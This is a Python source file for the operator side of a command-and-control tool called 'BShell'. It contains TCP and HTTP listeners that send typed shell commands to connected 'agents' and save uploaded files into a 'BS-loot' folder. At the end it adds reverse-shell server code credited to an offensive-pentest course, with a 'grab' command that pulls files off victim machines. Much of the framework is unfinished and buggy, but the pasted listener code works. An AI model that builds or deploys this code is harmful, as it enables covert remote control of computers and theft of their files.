
import http.server
import socket
import queue
import sys
import threading
import os, cgi
import time
from helpers import bcolors as bc


class Listener(threading.Thread):
    def __init__(self):     #Need to refer to parent menu or module?
        threading.Thread.__init__(self)
        self.recv_q = queue.Queue()
        self.send_q = queue.Queue()
        self.agent_list = {}
        self.commands = {
            'terminate' : self.terminate,
            'cd' : self.cd,
            'persist' : self.persist,
            'download' : self.download,
            'upload' : self.upload
                }

    def run(self):
        #Put main listener code here
        pass

    def listen(self):
        #Any one-off listener code can go here
        pass

    def send_command(self):
        for agent in agent_list:
            if agent.activated:
                #Send to activated agents
                pass

    def terminate(Self):
        pass

    def cd(Self):
        if len(agent_list) == 1:
            #Change prompt
            pass
        else:
            #Handle multiple agents, smoehow?
            pass

    def download(Self):
        #Download files
        pass

    def upload(self):
        #Upload files
        pass

class TCPConnectionHandler(threading.Thread):
    def __init__(self, listener):
        self.listener = listener
        threading.Thread.__init__(self)

    def run(self):
        (client, client_address) = self.listener.s.accept()
        newthread = AgentHandler(client, client_address, self.listener.q)
        self.listener.agent_list.append(newthread)
        newthread.start()


class TCPListener3(threading.Thread):
    def __init__(self, LHOST, LPORT, max_conns=100):
        threading.Thread.__init__(self)
        self.max_conns = max_conns
        self.q = queue.Queue()
        self.agent_list = []
        self.prompt = "BShell=>"
        self.command=""
        self.builtins = {
                'terminate' : self.terminate,
                'cd' : self.cd,
                'persist' : self.persist,
                'download' : self.download,
                'upload' : self.upload,
                'list' : self.list_agents,
                'select' : self.select_agents,
                'deselect' : self.deselect_agents,
                }
        self.LHOST = LHOST
        self.LPORT = LPORT

    def run(self):
        self.listen()
        sock_handl = TCPConnectionHandler(self)
        sock_handl.start()
        while True:
            #self.handle_new_agents()
            self.interpret_command()
            self.send_command()
            self.get_response()
    
    def listen(self):
        bc.blue_print('[-] - ', 'Starting listener on {} on port {}'.format(self.LHOST, self.LPORT))
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.s.bind((self.LHOST, self.LPORT))
            self.s.listen(self.max_conns)      #Listen for max of N connections
        except Exception as e:
            bc.err_print('[!] - Failed to bind socket : \n', str(e))
    
    def handle_new_agents(self):
        (client, client_address) = self.s.accept()
        newthread = AgentHandler(client, client_address, self.q)
        self.agent_list.append(newthread)
        newthread.start()


    def interpret_command(self):
        self.command = str(input(self.prompt))
        if self.command == "":
            pass
        else:
            command_verb = "".join(self.command.split(" ")[:1])
            command_args = self.command.split(" ")[1:]
            try:
                self.builtins.get(command_verb)()
            except:
                pass        #Will happen a lot if the verb isn't one of ours
            #if command_verb in self.builtins:   #If it's a builtin method, call it
            #    print("doing - {}, by calling {}".format(command_verb, self.builtins[command_verb]))
            #    try:
            #        caller = getattr(self, self.builtins[command_verb])
            #        caller(command_args)
            #    except Exception as e:
            #        return True, e
            #        bc.err_print("[!] - ", "Exception encountered:\n {}".format(e))
            #Otherwise it's CLI

    def send_command(self):
        #TODO - send only to active agents
        if not self.command:
            pass
        else:
            bc.blue_print("[+] - ", "Sending Command: {} to {} agents.".format(self.command, str(len(self.agent_list))))
            for i in range(len(self.agent_list)):
                time.sleep(0.1)
                self.q.put(self.command)

    def get_response(self):
        print("TODO - implement response code")
   
    def terminate(self):
        for i in range(len(self.agent_list)):
            #TODO - if agent is selected, terminate, run exit as different command
            time.sleep(0.1)
            self.q.put(SendCmd)
            time.sleep(5)
            os._exit(0)
    
    def list_agents(self):
        bc.blue_print("[-] - ","Following agents active:")
        for agent in self.agent_list:
            print(agent.name+ " - " + str(agent.client_addr))

    def select_agents(self, agent):
        print("TODO - set agent: {} selected".format(agent))

    def deselect_agents(self, agent):
        print("TODO - set agent: {} deselected".format(agent))

    def cd(self):
        pass

    def persist(self):
        pass
    
    def download(self):
        pass

    def upload(self):
        pass

class AgentManager(threading.Thread):
    def __init__(self, qv2, agent_list, client, client_addr):
        threading.Thread.__init__(self)
        self.q = qv2
        self.agent_list = agent_list#TODO - we need to pass the agent list back to the Listener
        self.client = client
        self.client_addr = client_addr
        self.ip = self.client_addr[0]
        self.port = self.client_addr[1]
        self.prompt = "BShell=>"
        self.command=""
        self.builtins=['terminate','cd','persist','download', 'upload']

    #This is the AgentCmd bit
    def run(self):
        while True:
            self.interpret_command()
            self.send_command()
            #self.get_reponses()
    
    def interpret_command(self):
        self.command = str(input(self.prompt))
        if self.command == "":
            pass
        else:
            command.verb = "".join(self.command.split(" ")[:1])
            command.args = self.command.split(" ")[1:]
            if command_verb in self.builtins:   #If it's a builtin method, call it
                try:
                    caller = getattr(self, command_verb)
                    caller(command_args)
                except Exception as e:
                    return True, e
            #Otherwise it's CLI

    def terminate(self):
        for i in range(len(self.agent_list)):
            #TODO - if agent is selected, terminate, run exit as different command
            time.sleep(0.1)
            self.q.put(SendCmd)
            time.sleep(5)
            os._exit(0)

    def send_command(self):
        #TODO - send only to active agents
        bc.blue_print("[+] - ", "Sending Command: {} to {} agents.".format(self.command, str(len(self.agent_list))))
        for i in range(len(self.agent_list)):
            time.sleep(0.1)
            self.q.put(self.command)
    
    def cd(self):
        pass

    def persist(self):
        pass
    
    def download(self):
        pass

    def upload(self):
        pass



class TCPListener(Listener):
    def __init__(self, LHOST, LPORT, max_conns=100):
        self.max_conns = max_conns
        self.q = queue.Queue()
        self.agent_list = []
        #super(TCPListener, self).__init__(self, LHOST, LPORT)
        super().__init__(LHOST, LPORT)

    def handle(self):
        bc.blue_print('[-] - ', 'Starting listener on {} on port {}'.format(self.LHOST, self.LPORT))
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.s.bind((self.LHOST, self.LPORT))
            self.s.listen(self.max_conns)      #Listen for max of N connections
        except Exception as e:
            bc.err_print('[!] - Failed to bind socket : \n', str(e))

        BigAgentThread = AgentCommander(self.q, self.agent_list)
        BigAgentThread.start()
        while True:
            (client, client_address) = self.s.accept()
            newthread = AgentHandler(client, client_address, self.q)
            self.agent_list.append(newthread)
            newthread.start()

class AgentCommander(threading.Thread):
        def __init__(self, qv2, agent_list):
            threading.Thread.__init__(self)
            self.q = qv2
            self.agent_list = agent_list
                             
        def run(self):
            while True:
                SendCmd = str(input("BShell=> "))
                if (SendCmd == ""):
                    pass
                elif (SendCmd == "terminate"):
                    for i in range(len(self.agent_list)):
                        time.sleep(0.1)
                        self.q.put(SendCmd)
                        time.sleep(5)
                        os._exit(0)
                else:
                    bc.blue_print("[+] - ", "Sending Command: {} to {} agents.".format(SendCmd, str(len(self.agent_list))))
                    for i in range(len(self.agent_list)):
                        time.sleep(0.1)
                        self.q.put(SendCmd)

class AgentHandler(threading.Thread):
    def __init__(self, client, client_addr, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_addr = client_addr
        self.ip = self.client_addr[0]
        self.port = self.client_addr[1]
        self.q = qv
        self.clientlist={}

    def run(self):
        self.agent_name = threading.current_thread().getName()
        bc.green_print('[-] - ', 'Agent {}:{} connected with Thread-ID : {}.'.format(self.ip, self.port, self.agent_name))
        self.clientlist[self.agent_name] = self.client_addr
        while True:
            command = self.q.get()
            try:
                self.client.send(command.encode())
            except Exception as e:
                bc.error_print('[!] - Error sending command for agent {} : \n'.format(self.agent_name), str(e))
                break



class HTTPListener(Listener):
    def __init__(self, LHOST, LPORT, upload_path = '/status/', save_dir = '/BS-loot/'):
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.upload_path = upload_path
        super(HTTPListener, self).__init__()
        self.cwd=''
        self.shell_text="BShell" + self.cwd +"=>"
        self.lcwd = os.getcwd()
        self.save_dir = save_dir
        if not os.path.isdir(self.lcwd + self.save_dir):
            os.makedirs(self.lcwd + self.save_dir)
        self.save_path = self.lcwd + self.save_dir

    def run(self):
        server_class = http.server.HTTPServer
        httpd = server_class((self.LHOST, self.LPORT), HTTPRequestHandler())
        try:
            bc.warn_print('[-] - ', 'Serving on {} and port {}'.format(self.LHOST, self.LPORT))
            httpd.serve_forever()
        except KeyboardInterrupt:
            bc.error_print ('[!] - ', 'Keyboard Interrupt - server terminated.')
            httpd.server_close()
        

class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def __init__(self, upload_path = '/status/', save_Dir = '/BS-loot/' ):
        self.upload_path = upload_path
        self.cwd=''
        self.shell_text="BShell" + self.cwd +"=>"
        self.lcwd = os.getcwd()
        self.save_dir = save_dir
        if not os.path.isdir(self.lcwd + self.save_dir):
            os.makedirs(self.lcwd + self.save_dir)
        self.save_path = self.lcwd + self.save_dir
        super(HTTPRequestHandler, self).__init__()

    def do_GET(self):
        command = input(self.shell_text)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == self.upload_path:
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                file_name, pdict = cgi.parse_header(self.headers.get('Filename'))
                if ctype == 'multipart/form-data' and file_name:
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    bc.error_print('[!] - ', 'Unexpected POST request')
                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'
                save_file = self.save_path + file_name
                with open(save_file, 'wb') as o: # create a file and write the received file 
                    bc.blue_print('[+] - ', 'Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                bc.error_print('[!] - ', str(e))
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        bc.warn_print('[-] - ', postVar.decode())




HOST_NAME = '192.168.0.152'
PORT_NUMBER = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):

        command = input("Shell> ")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):

        #Here we will use the points which we mentioned in the Client side, as a start if the "/store" was in the URL then this is a POST used for file transfer so we will parse the POST header, if its value was 'multipart/form-data' then we will pass the POST parameters to FieldStorage class, the "fs" object contains the returned values from FieldStorage in dictionary fashion.

        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-]Unexpected POST request')
                fs_up = fs['file'] # Remember, on the client side we submitted the file in dictionary fashion, and we used the key 'file'
                with open('/root/Desktop/place_holder.txt', 'wb') as o: # create a file holder called '1.txt' and write the received file into this '1.txt' 
                    print('[+] Writing file ..')
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        postVar = self.rfile.read(length)
        print(postVar.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print ('[!] Server is terminated')
        httpd.server_close()

# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import os
import socket

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/root/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)
def connecting():
    s = socket.socket()
    s.bind(("192.168.0.152", 8080))
    s.listen(1)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+]We got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())
def main():
    connecting()
#main()

